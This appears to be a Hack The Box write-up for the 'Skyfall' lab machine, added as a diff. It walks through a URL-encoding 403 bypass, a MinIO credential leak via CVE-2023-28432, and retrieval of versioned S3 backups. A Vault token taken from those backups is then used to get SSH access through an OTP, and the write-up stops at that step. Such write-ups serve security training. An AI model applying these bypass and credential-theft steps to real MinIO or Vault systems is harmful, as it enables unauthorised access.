@@ -1,0 +1,118 @@
+nmap shows port 22,80
+
+port 80 opens a website of skyfall.htb, doing the normal stuff directory fuzzing does not bring anything. Navigating the site we find a link demo.skyfall.htb which in order to make accessible we add the domain to /etc/hosts. 
+
+There is a login page which directly tells us a pair of credentials guest:guest. Login and we get redirected to demo skyfall dashboard.
+
+The dashboard despite being equipped with a variety of functionalities including file uploads and a URL fetcher, does not exhibit any apparent vulnerabilities. Enuemaring the new domain with gobuster finds us nothing.
+
+Trying the url fetcher we get a response(pop-up) at the bottom right corner of the page. We can try SSRF payloads but it got us nowhere.
+Analyzing the /files endpoing we could try an LFI on the download to the filename URL parameter. That gives us S3 discolure error. That indicates that there is a connection to some kind of cloud storage bucket. We can see that this storage might e MinIO as we can see from thte navbar. We click to the MinIO metrics but we get 403 response.
+
+Then we try 403 bypass!!
+A simple 403 bypass worked on this page
+http://demo.skyfall.htb/metrics%0A
+
+At the bottom of the page there is another endpoint found
+minio_endpoint_url | demo.skyfall.htb |http://prd23-s3-backend.skyfall.htb/minio/v2/metrics/cluster. Adding it to our hosts file we get a 403 response which cannot be bypassed like /metric. Searching, we find:
+https://github.com/acheiii/CVE-2023-28432
+This CVE references information disclosure vulnerability in MinIOs endopoint "/minio/bootstrap/v1/verify", which is another 403 bypass. Changing the request method from GET to POST leaks MINIO_ROOT_PASSWORD and MINIO_ROOT_USER.
+
+
+Searching regarding what MinIO is we find reading documentation that there is a way to communicate with MinIO through a cli interface. There is a command to intercatively work with the S3 storage from the terminal which is "mc". 
+https://min.io/docs/minio/linux/reference/minio-mc.html
+https://www.stackhero.io/en/services/MinIO/documentations/Getting-started#use-the-minio-cli
+
+'''
+curl https://dl.min.io/client/mc/release/linux-amd64/mc \
+  --create-dirs \
+  -o $HOME/minio-binaries/mc
+
+chmod +x $HOME/minio-binaries/mc
+export PATH=$PATH:$HOME/minio-binaries/
+
+mc --help
+'''
+
+To connect to the MinIO machine we run:
+./mc alias set myminio http://prd23-s3-backend.skyfall.htb <MINIO_ROOT_USER> <MINIO_ROOT_PASSWORD>
+and the response should be "Added `myminio` successfully."
+
+We can now list all the files in the service using:
+./mc ls --recursive (--versions) myminio
+48KiB STANDARD askyy/Welcome.pdf
+2.5KiB STANDARD askyy/home_backup.tar.gz
+48KiB STANDARD btanner/Welcome.pdf
+48KiB STANDARD emoneypenny/Welcome.pdf
+48KiB STANDARD gmallory/Welcome.pdf
+48KiB STANDARD guest/Welcome.pdf
+48KiB STANDARD jbond/Welcome.pdf
+48KiB STANDARD omansfield/Welcome.pdf
+48KiB STANDARD rsilva/Welcome.pdf
+
+We see there is a backup file. We can use minio clinet to copy files to our local machine using cp command.
+
+./mc cp --recursive myminio/askyy/home_backup.tar.gz .
+This makes a copy in our local machine. After unziping the file and analyzing it we find an id_rsa file which could not be used to login as the askyy user. In the documentation we see that we can list file versions with the --version flag.
+
+ ./mc ls --recursive --versions myminio/askyy/home_backup.tar.gz
+2.5KiB STANDARD 25835695-5e73-4c13-82f7-30fd2da2cf61 v3 PUT home_backup.tar.gz
+2.6KiB STANDARD 2b75346d-2a47-4203-ab09-3c9f878466b8 v2 PUT home_backup.tar.gz
+1.2MiB STANDARD 3c498578-8dfe-43b7-b679-32a3fe42018f v1 PUT home_backup.tar.gz
+
+
+Finding there were 3 different versions of this backup,and we downloaded the v3. 1st version is more interesting because is way larger that other two. But nothing interesting was found in it. Downloaded the second verson and found vault credentilas in .bashrc file.
+
+mc cp --recursive --version-id=3c498578-8dfe-43b7-b679-32a3fe42018f myminio/askyy/home_backup.tar.gz .
+
+mc cp --version-id=2b75346d-2a47-4203-ab09-3c9f878466b8 myminio/askyy/home_backup.tar.gz .
+
+unzip the files with tar:
+tar -xzvf home_backup.tar.gz 
+./
+./.profile
+./.bashrc
+./.ssh/
+./.ssh/authorized_keys
+./.sudo_as_admin_successful
+./.bash_history
+./.bash_logout
+./.cache/
+./.cache/motd.legal-displayed
+
+Inside the backup file, we can find these lines inside the .bashrc file:
+
+[..redacted...]
+
+export VAULT_API_ADDR="http://prd23-vault-internal.skyfall.htb"
+export VAULT_TOKEN="hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE"
+[...redacted...]
+
+With the HashiCorp vault endpoint and vault key, we can get foothold by generating an ssh OTP (One-Time Password). First, we must install HashiCorp vault in our machine. I use Arch Linux, so I installed it with "sudo snap install vault" or you can use:
+wget https://releases.hashicorp.com/vault/1.15.5/vault_1.15.5_linux_amd64.zip
+unzip vault_1.15.5_linux_amd64.zip
+export VAULT_ADDR="http://prd23-vault-internal.skyfall.htb"
+./vault login
+
+
+export VAULT_TOKEN="hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE"
+export VAULT_ADDR="http://prd23-vault-internal.skyfall.(add this new host to /etc/hosts)
+
+./vault status
+
+We can list OTP keys using:
+
+vault list ssh/roles
+Keys
+----
+admin_otp_key_role
+dev_otp_key_role
+We cannot use the admin_otp_key_role key, as it gives us permission denied. But we can use the other key. 
+
+./vault ssh -role dev_otp_key_role -mode otp -strict-host-key-checking=no askyy@10.10.11.254
+
+
+
+
+
+
